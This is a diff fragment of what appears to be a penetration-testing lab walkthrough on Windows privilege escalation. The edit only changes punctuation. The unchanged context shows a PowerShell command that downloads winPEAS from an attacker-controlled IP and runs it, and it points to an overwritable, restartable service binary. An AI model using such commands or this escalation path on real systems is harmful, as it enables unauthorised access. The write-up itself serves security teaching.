@@ -41,7 +41,7 @@ powershell -c "Invoke-WebRequest -Uri http://10.13.26.40/winPEASx64.exe -OutFile
 .\winPEASx64.exe
 ```
 
-Interestingly, while WinPEAS notes that ASCServie.exe is vulnerable to an overwrite, it looks like it misses the fact that the compromised user can restart it. That said, WinPEAS does display *a lot* more information than PowerUp, so it might be useful to run *both*...
+Interestingly, while WinPEAS notes that ASCServie.exe is vulnerable to an overwrite, it looks like it misses the fact that the compromised user can restart it. That said, WinPEAS does display *a lot* more information than PowerUp, so it might be useful to run *both*…
 
 Useful PowerShell commands:
 
